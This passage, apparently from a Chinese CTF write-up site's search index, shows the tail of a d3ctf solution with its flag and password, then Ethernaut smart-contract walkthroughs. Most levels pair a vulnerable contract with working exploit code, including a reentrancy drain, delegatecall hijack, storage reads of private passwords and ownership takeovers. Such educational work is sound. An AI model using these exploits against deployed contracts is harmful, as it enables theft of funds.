VGV4dF9ibGluZF93YXRlcm1hcmsgcHdkIGlzOiBSQHkwZjEhOWh0 base64\u89e3\u7801\uff1a Text_blind_watermark pwd is: R@y0f1!9ht guofei9987/text_blind_watermark from text_blind_watermark import extract print ( f \"d3ctf {{ { extract ( open ( 'Future will lead.txt' , 'r' ) . read (), 'R@y0f1!9ht' ) . strip () } }} \" ) flag: d3ctf{b576241258a44b868ea25804b0ec1d4e}","title":"WannaWacca"},{"location":"writeups/ethernaut/","text":"Ethernaut Writeups \u00b6 Abstract https://ethernaut.openzeppelin.com/ \u4e0a\u7684\u4e00\u7cfb\u5217\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u7c7b\u9898\u76ee\uff0c\u5165\u95e8 blockchain \u7684\u65f6\u5019\u505a\u7684\uff0c\u8fd9\u91cc\u8bb0\u4e0b\u505a\u9898\u8bb0\u5f55 \u524d\u7f6e\u6b65\u9aa4\uff1a \u5b89\u88c5 MetaMask \u6d4f\u89c8\u5668\u63d2\u4ef6\uff0c\u5e76\u521b\u5efa\u65b0\u8d26\u6237 \u8fde\u63a5\u5230 Rinkeby \u6d4b\u8bd5\u7f51\u7edc \u901a\u8fc7 https://faucet.rinkeby.io/ \u6216\u8005 https://faucets.chain.link/rinkeby \u641e\u70b9\u6d4b\u8bd5\u5e01\uff08\u4e3b\u8981\u7528\u6765\u540e\u7eed\u652f\u4ed8 gas\uff09 \u5728 ethernaut \u4e0a\u8fde\u63a5 MetaMask \u6bcf\u4e00\u9053\u9898\u76ee\u5148\u751f\u6210\u65b0\u5b9e\u4f8b\uff0c\u5728 console \u4e2d\u5b8c\u6210\u540e\u63d0\u4ea4\u5b9e\u4f8b Hello Ethernaut \u00b6 \u6309\u7167\u9898\u76ee\u63d0\u793a\u4e00\u6b65\u4e00\u6b65\u8c03\u7528\u51fd\u6570\u5373\u53ef Fallback \u00b6 \u7ed9\u4e86\u5408\u7ea6\u6e90\u7801 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Fallback { using SafeMath for uint256 ; mapping ( address => uint ) public contributions ; address payable public owner ; constructor () public { owner = msg.sender ; contributions [ msg.sender ] = 1000 * ( 1 ether ); } modifier onlyOwner { require ( msg.sender == owner , \"caller is not the owner\" ); _ ; } function contribute () public payable { require ( msg.value < 0 . 001 ether ); contributions [ msg.sender ] += msg.value ; if ( contributions [ msg.sender ] > contributions [ owner ]) { owner = msg.sender ; } } function getContribution () public view returns ( uint ) { return contributions [ msg.sender ]; } function withdraw () public onlyOwner { owner . transfer ( address ( this ). balance ); } receive () external payable { require ( msg.value > 0 && contributions [ msg.sender ] > 0 ); owner = msg.sender ; } } \u76ee\u6807\u662f\u62ff\u5230\u8fd9\u4e2a\u5408\u7ea6\u7684\u63a7\u5236\u6743\uff0c\u8f6c\u51fa\u6240\u6709\u4f59\u989d \u4e3b\u8981\u903b\u8f91\u662f contribute \u51fd\u6570\u4f1a\u589e\u52a0\u8c03\u7528\u8005\u7684 contributions\uff0c\u5f53\u5927\u4e8e 1000 ether \u7684\u65f6\u5019\uff0c\u4f1a\u628a\u6240\u6709\u6743\u8f6c\u7ed9\u73a9\u5bb6\u3002\u901a\u8fc7\u8fd9\u4e2a\u6765\u83b7\u5f97\u63a7\u5236\u6743\u662f\u4e0d\u73b0\u5b9e\u7684 \u800c\u53e6\u4e00\u4e2a\u4f1a\u53d1\u751f\u6240\u6709\u6743\u8f6c\u6362\u7684\u51fd\u6570\u662f receive \u51fd\u6570\uff0c\u8fd9\u662f\u4e00\u4e2a fallback \u51fd\u6570\uff0c\u4f1a\u5728\u5408\u7ea6\u8d26\u6237\u63a5\u6536\u4ee5\u592a\u5e01\u7684\u65f6\u5019\u89e6\u53d1\uff0c\u6240\u4ee5\u5728\u8fd9\u91cc\u53ea\u8981\u5411\u5408\u7ea6\u53d1\u51fa\u5e26\u6709\u4ee5\u592a\u5e01\u7684\u4ea4\u6613\u5c31\u53ef\u4ee5\u89e6\u53d1\u8fd9\u4e2a\u51fd\u6570\u8f6c\u79fb\u6240\u6709\u6743 \u800c\u4e4b\u524d\u8fd8\u9700\u8981\u5148\u4fdd\u8bc1 contributions \u5927\u4e8e 0\uff0c\u6240\u4ee5\u89e3\u6cd5\uff1a > contract . contribute ({ value : 1 }) // \u4f7f contributions \u5927\u4e8e 0 > contract . sendTransaction ({ value : 1 }) // \u89e6\u53d1 fallback \u8f6c\u79fb\u6240\u6709\u6743 > contract . withdraw () // \u8f6c\u51fa\u6240\u6709\u4f59\u989d Fallout \u00b6 \u8981\u6c42\u5f97\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743 \u6839\u636e\u5408\u7ea6\u6e90\u7801\u53ef\u4ee5\u53d1\u73b0\u5b83\u7684 constructor \u7684\u51fd\u6570\u540d\u4e3a Fal1out\uff0c\u5e76\u4e0d\u662f\u5408\u7ea6\u540d Fallout\uff0c\u6709 l1 \u7684\u5dee\u522b \u6240\u4ee5\u76f4\u63a5\u8c03\u7528 contract.Fal1out() \u5c31\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u62ff\u5230\u5408\u7ea6\u6240\u6709\u6743 Coin Flip \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract CoinFlip { using SafeMath for uint256 ; uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () public { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( blockhash ( block.number . sub ( 1 ))); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue . div ( FACTOR ); bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } \u8981\u6c42\u8fde\u7eed\u731c\u5bf9\u5341\u6b21\uff0c\u5408\u7ea6\u4e2d\u7ed9\u51fa\u4e86\u5b83\u53d6\u968f\u673a\u6570\u7684\u65b9\u5f0f\uff0c\u5373\u5c06 block.number \u51cf\u4e00\uff0c\u53d6\u54c8\u5e0c\u503c\uff0c\u7136\u540e\u518d\u9664\u4ee5 FACTOR \u5224\u65ad\u662f\u5426\u4e3a 1 \u6240\u4ee5\u5199\u4e00\u4e2a\u65b0\u5408\u7ea6\u6765\u83b7\u53d6\u540c\u6837\u7684 block.number \u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa\u7b54\u6848 \u56e0\u4e3a\u5224\u65ad\u4e86 lashHash == blockValue \u7684\u65f6\u5019 revert\uff0c\u6240\u4ee5\u9700\u8981\u7b49\u4e00\u6bb5\u65f6\u95f4\uff0c\u9010\u6b21\u731c\u6d4b\uff0c\u8fde\u7eed\u731c 10 \u6b21 exp // SPDX-License-Identifier: GPL-3.0 pragma solidity ^ 0.6.0 ; /* code of CoinFlip */ contract Exploit { using SafeMath for uint256 ; CoinFlip p ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor ( address challenge ) public { p = CoinFlip ( challenge ); } function exp () public { uint256 blockValue = uint256 ( blockhash ( block.number . sub ( 1 ))); uint256 coinFlip = blockValue . div ( FACTOR ); bool side = coinFlip == 1 ? true : false ; p . flip ( side ); } } Telephone \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Telephone { address public owner ; constructor () public { owner = msg.sender ; } function changeOwner ( address _owner ) public { if ( tx.origin != msg.sender ) { owner = _owner ; } } } \u4e5f\u662f\u9700\u8981\u62ff\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743\uff0c\u800c\u8c03\u7528\u5408\u7ea6\u4e2d\u7684 changeOwner \u51fd\u6570\u6765\u8f6c\u79fb\u6240\u6709\u6743\u7684\u8bdd\uff0c\u9700\u8981\u4f7f tx.origin \u548c msg.sender \u4e0d\u540c \u5b83\u4eec\u7684\u533a\u522b\uff1a tx.origin\uff1a\u4ea4\u6613\u53d1\u9001\u65b9\uff0c\u662f\u6574\u4e2a\u4ea4\u6613\u6700\u5f00\u59cb\u7684\u5730\u5740 msg.sender\uff1a\u6d88\u606f\u53d1\u9001\u65b9\uff0c\u662f\u5f53\u524d\u8c03\u7528\u7684\u8c03\u7528\u65b9\u5730\u5740 \u6240\u4ee5\u5982\u679c\u901a\u8fc7 \u8d26\u6237 A -> \u5408\u7ea6 A -> \u5408\u7ea6 B \u6765\u8c03\u7528\u7684\u8bdd\uff0ctx.origin \u5c31\u662f\u8d26\u6237 A\uff0c\u800c\u5bf9\u4e8e\u5408\u7ea6 B \u6765\u8bf4\uff0cmsg.sender \u662f\u5408\u7ea6 A \u6240\u4ee5\u8fd9\u9898\u53ea\u9700\u8981\u7f16\u5199\u4e00\u4e2a\u65b0\u7684\u5408\u7ea6\u6765\u8c03\u7528\u9898\u76ee\u7684 changeOwner \u51fd\u6570\u5c31\u597d\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Telephone */ contract Exploit { Telephone p = Telephone ( < instance address > ); function exp () public { p . changeOwner ( msg.sender ); } } Token \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Token { mapping ( address => uint ) balances ; uint public totalSupply ; constructor ( uint _initialSupply ) public { balances [ msg.sender ] = totalSupply = _initialSupply ; } function transfer ( address _to , uint _value ) public returns ( bool ) { require ( balances [ msg.sender ] - _value >= 0 ); balances [ msg.sender ] -= _value ; balances [ _to ] += _value ; return true ; } function balanceOf ( address _owner ) public view returns ( uint balance ) { return balances [ _owner ]; } } \u5f00\u5c40\u81ea\u5df1\u7684 balance \u662f 20\uff0c\u76ee\u7684\u662f\u589e\u52a0\u81ea\u5df1\u7684 balance \u53ef\u4ee5\u53d1\u73b0 transfer \u4e2d\u662f\u76f4\u63a5\u5c06 sender \u7684 balance \u51cf\u8f6c\u8d26\u7684 value\uff0c\u800c\u5982\u679c value \u8d85\u8fc7 balance \u5219\u4f1a\u53d1\u751f\u6ea2\u51fa\uff0c\u56e0\u4e3a\u662f uint\uff0c\u5219\u4f1a\u53d8\u4e3a\u5f88\u5927\u7684\u503c \u6240\u4ee5\u901a\u8fc7 await contract . transfer ( < any address > , 21 ) \u5373\u53ef\u4f7f\u81ea\u5df1\u7684 balance \u6ea2\u51fa\u53d8\u5927 Delegation \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Delegate { address public owner ; constructor ( address _owner ) public { owner = _owner ; } function pwn () public { owner = msg.sender ; } } contract Delegation { address public owner ; Delegate delegate ; constructor ( address _delegateAddress ) public { delegate = Delegate ( _delegateAddress ); owner = msg.sender ; } fallback () external { ( bool result ,) = address ( delegate ). delegatecall ( msg.data ); if ( result ) { this ; } } } \u76ee\u7684\u8fd8\u662f\u62ff\u5230\u6240\u6709\u6743\uff0c\u5373\u6267\u884c Delegate \u4e2d\u7684 pwn \u51fd\u6570 \u53ef\u4ee5\u901a\u8fc7\u89e6\u53d1 fallback \u51fd\u6570\uff0c\u7136\u540e\u8c03\u7528 delegatecall \u6765\u901a\u8fc7 msg.data \u8c03\u7528 pwn \u51fd\u6570 data \u4e2d\u524d\u56db\u4e2a\u5b57\u8282\u662f\u8981\u8c03\u7528\u7684\u51fd\u6570\u524d\u9762\u7684 sha3 \u503c\u7684\u524d\u56db\u4e2a\u5b57\u8282\uff0c\u540e\u9762\u5982\u679c\u6ca1\u6709\u4f20\u5165\u6570\u636e\u53ef\u4ee5\u7701\u7565 \u6240\u4ee5\u8ba1\u7b97\u51fa pwn() \u7684 sha3 \u7136\u540e\u4f5c\u4e3a data \u4f20\u7ed9 fallback \u5373\u53ef > web3 . utils . sha3 ( \"pwn()\" ) '0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab' > contract . sendTransaction ({ data : \"0xdd365b8b\" }) Force \u00b6 \u9898\u76ee\u662f\u4e00\u4e2a\u7a7a\u7684\u5408\u7ea6\uff0c\u8981\u6c42\u5411\u5176\u4e2d\u8f6c\u8d26 \u800c\u4e00\u4e2a\u5408\u7ea6\u5728\u81ea\u6bc1\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u5c06\u4f59\u989d\u5168\u90e8\u5f3a\u5236\u8f6c\u5230\u53e6\u4e00\u4e2a\u5730\u5740\u4e0a\uff0c\u6240\u4ee5\u65b0\u5efa\u4e00\u4e2a\u5408\u7ea6\u7136\u540e\u81ea\u6bc1\uff0c\u628a\u4f59\u989d\u8f6c\u5230\u5b9e\u4f8b\u5730\u5740\u4e0a\u5c31\u53ef\u4ee5\u4e86 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { constructor () public payable {} // \u521d\u59cb\u8981\u63a5\u6536 value \u6765\u521b\u5efa\u5408\u7ea6 function exp ( address challenge ) public { // \u9700\u8981\u5148\u5f3a\u5236\u8f6c\u6362\u4e3a payable address payable challenge = payable ( address ( challenge )); selfdestruct ( challenge ); } } Vault \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Vault { bool public locked ; bytes32 private password ; constructor ( bytes32 _password ) public { locked = true ; password = _password ; } function unlock ( bytes32 _password ) public { if ( password == _password ) { locked = false ; } } } \u8981 unlock \u8fd9\u4e2a\u5408\u7ea6\u8d26\u6237\uff0c\u4e5f\u5c31\u662f\u8981\u627e\u5230 password \u867d\u7136 password \u88ab\u8bbe\u4e3a\u4e86 private\uff0c\u4f46\u662f\u5728\u533a\u5757\u4e2d\u7684\u6570\u636e\u4ecd\u7136\u662f\u53ef\u89c1\u7684\uff0c\u6240\u4ee5\u53ea\u8981 getStorageAt \u5c31\u53ef\u4ee5\u4e86\uff1a > await web3 . eth . getStorageAt ( instance , 1 ) // 0 \u4e3a locked \u7684\u4f4d\u7f6e\uff0c1 \u4e3a password '0x412076657279207374726f6e67207365637265742070617373776f7264203a29' > web3 . utils . toAscii ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) 'A very strong secret password :)' > await contract . unlock ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) // \u53c2\u6570\u662f bytes32\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u4f20\u5b57\u7b26\u4e32\u8fdb\u53bb King \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract King { address payable king ; uint public prize ; address payable public owner ; constructor () public payable { owner = msg.sender ; king = msg.sender ; prize = msg.value ; } receive () external payable { require ( msg.value >= prize || msg.sender == owner ); king . transfer ( msg.value ); king = msg.sender ; prize = msg.value ; } function _king () public view returns ( address payable ) { return king ; } } \u5f53\u9898\u76ee\u518d\u6b21\u51fa\u8d44\u66f4\u9ad8\u7684\u65f6\u5019\uff0cking \u5c31\u4f1a\u56de\u5230\u9898\u76ee\u4e0a\uff0c\u8981\u4fdd\u6301 king \u5728\u81ea\u5df1\u8eab\u4e0a \u800c\u6bcf\u6b21\u66f4\u6362 king \u7684\u65f6\u5019\u90fd\u4f1a\u5148\u628a\u91d1\u989d transfer \u7ed9\u4e0a\u4e00\u4e2a king\uff0c\u6240\u4ee5\u53ea\u8981\u4e0d\u63a5\u6536\u5c31\u597d\u4e86 \u53ef\u4ee5\u4f7f\u7528 fallback\uff0c\u7136\u540e\u51fd\u6570\u91cc\u9762\u76f4\u63a5 revert // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { constructor ( address challenge ) public payable { challenge . call . gas ( 10000000 ). value ( msg.value )( \"\" ); } fallback () external { revert (); } } \u6ce8\u610f\u9700\u8981\u652f\u4ed8\u5927\u4e8e 1 ether \u624d\u53ef\u4ee5\u5148\u62ff\u5230 king Re-entrancy \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Reentrance { using SafeMath for uint256 ; mapping ( address => uint ) public balances ; function donate ( address _to ) public payable { balances [ _to ] = balances [ _to ]. add ( msg.value ); } function balanceOf ( address _who ) public view returns ( uint balance ) { return balances [ _who ]; } function withdraw ( uint _amount ) public { if ( balances [ msg.sender ] >= _amount ) { ( bool result ,) = msg.sender . call { value : _amount }( \"\" ); if ( result ) { _amount ; } balances [ msg.sender ] -= _amount ; } } receive () external payable {} } \u91cd\u5165\u653b\u51fb\uff0c\u56e0\u4e3a\u4f7f\u7528\u7684\u662f msg . sender . call { value : _amount }( \"\" ) \uff0c\u5e76\u4e14\u5728\u8fd9\u4e4b\u540e\u624d\u51cf\u5c11 balances \u800c\u8fd9\u4e2a call \u4f1a\u6389\u5230 fallback \u4e2d\uff0c\u5982\u679c fallback \u91cc\u518d\u6b21\u8c03\u7528\u4e86 withdraw \u5c31\u5b9e\u73b0\u4e86\u91cd\u5165\u653b\u51fb\uff0c\u4e0d\u65ad\u53d6\u51fa\u76ee\u6807\u5408\u7ea6\u7684\u4f59\u989d\u76f4\u5230\u4e3a 0 \u5148\u901a\u8fc7 await getBalance ( instance ) \u5f97\u5230\u76ee\u6807\u5408\u7ea6\u4e2d\u7684 balance \u4e3a 0.001 ether\uff0c\u6240\u4ee5\u6bcf\u6b21 withdraw 0.001 ether \u5c31\u597d exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Reentrance */ contract Exploit { Reentrance challenge ; constructor ( address payable addr ) public payable { challenge = Reentrance ( addr ); } function exp () public { challenge . withdraw ( 0 . 001 ether ); } fallback () external payable { if ( address ( challenge ). balance >= 0 ) { challenge . withdraw ( 0 . 001 ether ); } } } \u9996\u5148\u76f4\u63a5\u90e8\u7f72\u5408\u7ea6\uff0c\u7136\u540e contract . donate . sendTransaction ( < exp contract addr > , { value : toWei ( \"0.001\" )}) \u5148 donate 0.001 ether\uff0c\u7136\u540e\u8c03\u7528 exp \u51fd\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u91cd\u5165\u653b\u51fb\u63d0\u53d6\u51fa\u76ee\u6807\u5408\u7ea6\u4e2d\u7684\u6240\u6709\u4f59\u989d Elevator \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; interface Building { function isLastFloor ( uint ) external returns ( bool ); } contract Elevator { bool public top ; uint public floor ; function goTo ( uint _floor ) public { Building building = Building ( msg.sender ); if ( ! building . isLastFloor ( _floor )) { floor = _floor ; top = building . isLastFloor ( floor ); } } } \u76ee\u7684\u662f\u4f7f\u7535\u68af\u8fbe\u5230\u6700\u9876\u5c42\uff0c\u5373\u4f7f\u9898\u76ee\u5408\u7ea6\u7684 top \u4e3a true \u56e0\u4e3a top \u7684\u53d8\u5316\u53ea\u4f1a\u5728 goTo \u91cc\u53d1\u751f\u53d8\u5316\uff0c\u5e76\u4e14\u53ea\u6709\u5728 isLastFloor \u4e3a false \u7684\u65f6\u5019\u624d\u4f1a\u6539 top\uff0c\u800c\u4e14\u4e24\u6b21\u8c03\u7528 isLastFloor \u7684\u8f93\u5165\u4e00\u6837 \u6240\u4ee5\u53ea\u9700\u8981\u8ba9\u7b2c\u4e00\u6b21\u8c03\u7528 isLastFloor \u8fd4\u56de false\uff0c\u7b2c\u4e8c\u6b21\u8fd4\u56de true \u5c31\u53ef\u4ee5\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Elevator */ contract Exploit { Elevator elevator ; bool top = true ; constructor ( address challenge ) public { elevator = Elevator ( challenge ); } function isLastFloor ( uint ) public returns ( bool ) { top = ! top ; // \u8c03\u7528\u4e00\u6b21\u5c31\u6539\u4e00\u6b21\u8fd4\u56de\u503c return top ; } function exp () public { elevator . goTo ( 1 ); } } \u8fd9\u6837\u5728\u90e8\u7f72\u4e4b\u540e\u8c03\u7528 exp \u51fd\u6570\u5c31\u53ef\u4ee5\u8ba9 top \u4e3a true Privacy \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Privacy { bool public locked = true ; uint256 public ID = block.timestamp ; uint8 private flattening = 10 ; uint8 private denomination = 255 ; uint16 private awkwardness = uint16 ( now ); bytes32 [ 3 ] private data ; constructor ( bytes32 [ 3 ] memory _data ) public { data = _data ; } function unlock ( bytes16 _key ) public { require ( _key == bytes16 ( data [ 2 ])); locked = false ; } } \u548c Vault \u90a3\u9898\u5f88\u76f8\u4f3c\uff0c\u90fd\u662f\u8981\u8bfb\u53d6 private \u5185\u5bb9\uff0c\u7136\u540e\u8c03\u7528 unlock \u540c\u6837\u6765\u7528 web3 . eth . getStorageAt \u6765 dump \u51fa storage\uff1a > await web3 . eth . getStorageAt ( instance , 0 ) '0x0000000000000000000000000000000000000000000000000000000000000001' > await web3 . eth . getStorageAt ( instance , 1 ) '0x00000000000000000000000000000000000000000000000000000000623b0e73' > await web3 . eth . getStorageAt ( instance , 2 ) '0x000000000000000000000000000000000000000000000000000000000e73ff0a' > await web3 . eth . getStorageAt ( instance , 3 ) '0x3c991a198af652eb94710764c3f0401f1120427381fa7c46eeb6231cde2c9569' > await web3 . eth . getStorageAt ( instance , 4 ) '0xa792357f9443825334e26c299815fc6253b294b4a9155f49ea735bd2631dc364' > await web3 . eth . getStorageAt ( instance , 5 ) '0x6710884543189de73f0dfb9d36a99f2a5e9c3c7e5eb1fd1dead5f49ee955cdcf' > await web3 . eth . getStorageAt ( instance , 6 ) '0x0000000000000000000000000000000000000000000000000000000000000000' \u4e0d\u96be\u770b\u51fa 0 \u5904\u5b58\u50a8\u7684\u662f bool locked\uff0c1 \u5904\u662f\u4e00\u4e2a 256 \u4f4d ID\uff0c2 \u5904\u662f\u5269\u4e0b\u7684\u4e24\u4e2a uint8\u3001\u4e00\u4e2a uint16 \u62fc\u51fa\u6765\u7684\uff0c\u800c 3\uff5e5 \u5c31\u662f data \u4e86 \u6240\u4ee5 data[2] \u4e5f\u5c31\u662f 0x6710884543189de73f0dfb9d36a99f2a5e9c3c7e5eb1fd1dead5f49ee955cdcf \u800c unlock \u9700\u8981 bytes16\uff0c\u800c\u4e14\u5728\u5185\u90e8\u5c06 data[2] \u5f3a\u5236\u8f6c\u6362\u4e3a\u4e86 bytes16\uff0c\u8fd9\u4f1a\u53d6\u524d 16 \u5b57\u8282\uff0c\u6240\u4ee5\u6700\u540e\u8c03\u7528 unlock: contract . unlock ( \"0x6710884543189de73f0dfb9d36a99f2a\" ) Gatekeeper One \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract GatekeeperOne { using SafeMath for uint256 ; address public entrant ; modifier gateOne () { require ( msg.sender != tx.origin ); _ ; } modifier gateTwo () { require ( gasleft (). mod ( 8191 ) == 0 ); _ ; } modifier gateThree ( bytes8 _gateKey ) { require ( uint32 ( uint64 ( _gateKey )) == uint16 ( uint64 ( _gateKey )), \"GatekeeperOne: invalid gateThree part one\" ); require ( uint32 ( uint64 ( _gateKey )) != uint64 ( _gateKey ), \"GatekeeperOne: invalid gateThree part two\" ); require ( uint32 ( uint64 ( _gateKey )) == uint16 ( tx.origin ), \"GatekeeperOne: invalid gateThree part three\" ); _ ; } function enter ( bytes8 _gateKey ) public gateOne gateTwo gateThree ( _gateKey ) returns ( bool ) { entrant = tx.origin ; return true ; } } \u76ee\u6807\u662f\u901a\u8fc7\u4e09\u4e2a modifier \u7684\u68c0\u6d4b\uff0c\u5373\u6709\u4e09\u4e2a\u8981\u6c42 msg.sender != tx.origin\uff1a\u5373\u901a\u8fc7\u4e00\u4e2a\u5408\u7ea6\u6765\u95f4\u63a5\u8c03\u7528 enter gasleft() % 8191 == 0\uff1a\u8fd0\u884c\u5230\u8fd9\u4e00\u6b65\u65f6\u5269\u4f59\u7684 gas \u8981\u662f 8191 \u7684\u500d\u6570 \u8f93\u5165\u7684 _gateKey \u6ee1\u8db3\u4e09\u4e2a\u6761\u4ef6 \u7b2c\u4e00\u4e2a\u597d\u529e\uff0c\u76f4\u63a5\u5199\u4e00\u4e2a\u5408\u7ea6\u5c31\u597d \u7b2c\u4e8c\u4e2a\u56e0\u4e3a\u8fc7\u7a0b\u4e2d\u4f1a\u6d88\u8017\u591a\u5c11 gas \u4e0d\u660e\u786e\uff0c\u6240\u4ee5\u8981\u5148\u5199\u4e00\u4e2a\u8bd5\u8bd5\u6765 debug\uff0c\u770b\u770b\u4e2d\u9014\u6d88\u8017\u4e86\u591a\u5c11 gas\uff1a contract Exploit { GatekeeperOne challenge ; constructor ( address addr ) public { challenge = GatekeeperOne ( addr ); } function exp () public { challenge . enter . gas ( 81910 )( bytes8 ( \"0x123456\" )); } } \u5148\u968f\u610f\u8bbe\u7f6e gas \u4e3a 81910\uff0c\u7136\u540e\u90e8\u7f72\u5408\u7ea6\u3001\u8c03\u7528\uff0cdebug\uff08\u9700\u8981\u8c03\u5230 JavaScript VM \u4e0a\uff0c\u4f7f\u7528 Inject \u7684 Rinkeby \u7f51\u7edc\u597d\u50cf\u6ca1\u6cd5\u8c03\u8bd5\uff09 \u5355\u6b65\u8fd0\u884c\uff0c\u76f4\u5230\u6d41\u7a0b\u8fdb\u5165\u5230 gateTwo \u51fd\u6570\u4e2d\u7684 GAS \u6307\u4ee4\uff08\u5c06\u5269\u4f59\u7684 gas \u538b\u5165\u6808\u4e2d\uff09\uff0c\u6b64\u65f6\u663e\u793a\u5f53\u524d\u6b65 gas \u4e3a 2\uff0c\u5269\u4f59 gas \u4e3a 81658 \u6240\u4ee5\u8f93\u5165\u7684 gas \u4e3a 81910 + (81910 - 81658) + 2 = 82164 \u65f6\uff0c\u538b\u5165\u6808\u4e2d\u7684 gas \u521a\u597d\u662f 81910 \u5bf9\u4e8e\u7b2c\u4e09\u4e2a\uff0cbytes8 \u76f8\u5f53\u4e8e uint64\uff0c\u800c\u4e14\u4f7f\u7528 uintx \u6765\u5f3a\u5236\u8f6c\u6362\u65f6\u4ece\u540e\u5f80\u524d\u53d6\uff0c\u6240\u4ee5\u9700\u8981\u6ee1\u8db3\uff1a 16~31 \u4f4d\uff08\u540e 3\u30014 \u5b57\u8282\uff09\u4e3a 0 32 \u4f4d\u53ca\u4ee5\u4e0a\u4e0d\u5168\u4e3a 0 0~15 \u4f4d\uff08\u540e\u4e24\u4e2a\u5b57\u8282\uff09\u548c\u81ea\u5df1\u5730\u5740\u7684\u540e\u4e24\u4e2a\u5b57\u8282\u76f8\u540c \u6240\u4ee5\u53ef\u4ee5\u6784\u9020\u51fa\u9700\u8981\u7684 bytes8 \u4e3a bytes8 ( 0x0000000100000E28 ) \uff0c\u628a\u8fd9\u4e2a\u8f93\u5165\u5c31\u53ef\u4ee5\u901a\u8fc7\u4e09\u4e2a gate \u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { GatekeeperOne challenge ; constructor ( address addr ) public { challenge = GatekeeperOne ( addr ); } function exp () public { challenge . enter . gas ( 82164 )( bytes8 ( 0x0000000100000E28 )); } } Gatekeeper Two \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract GatekeeperTwo { address public entrant ; modifier gateOne () { require ( msg.sender != tx.origin ); _ ; } modifier gateTwo () { uint x ; assembly { x : = extcodesize ( caller ()) } require ( x == 0 ); _ ; } modifier gateThree ( bytes8 _gateKey ) { require ( uint64 ( bytes8 ( keccak256 ( abi . encodePacked ( msg.sender )))) ^ uint64 ( _gateKey ) == uint64 ( 0 ) - 1 ); _ ; } function enter ( bytes8 _gateKey ) public gateOne gateTwo gateThree ( _gateKey ) returns ( bool ) { entrant = tx.origin ; return true ; } } \u548c\u4e0a\u4e00\u9898\u4e00\u6837\uff0c\u4e5f\u662f\u6709\u4e09\u4e2a\u8981\u6c42\uff1a msg.sender != tx.origin \u5f53\u524d caller \u7684 codesize \u4e3a 0 gateKey \u5f02\u6216 sender \u7684 keccak256 \u7684\u524d 8 \u5b57\u8282\u4e3a 0-1=0xFFFFFFFFFFFFFFFF \u7b2c\u4e00\u4e2a\u540c\u6837\u901a\u8fc7\u5408\u7ea6\u89e3\u51b3 \u7b2c\u4e8c\u4e2a\uff0c\u5f53\u5408\u7ea6\u8fd8\u6ca1\u521b\u5efa\u5b8c\u6210\u7684\u65f6\u5019 codesize \u4e3a 0\uff0c\u6240\u4ee5 exp \u8981\u5199\u5728 constructor \u91cc \u7b2c\u4e09\u4e2a\uff0c\u5f02\u6216\u8ba1\u7b97\u4e00\u4e0b\u5c31\u597d exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { GatekeeperTwo challenge ; constructor ( address addr ) public { challenge = GatekeeperTwo ( addr ); uint64 key = uint64 ( bytes8 ( keccak256 ( abi . encodePacked ( this )))) ^ uint64 ( 0xFFFFFFFFFFFFFFFF ); challenge . enter ( bytes8 ( key )); } } Naught Coin \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/token/ERC20/ERC20.sol' ; contract NaughtCoin is ERC20 { // string public constant name = 'NaughtCoin'; // string public constant symbol = '0x0'; // uint public constant decimals = 18; uint public timeLock = now + 10 * 365 days ; uint256 public INITIAL_SUPPLY ; address public player ; constructor ( address _player 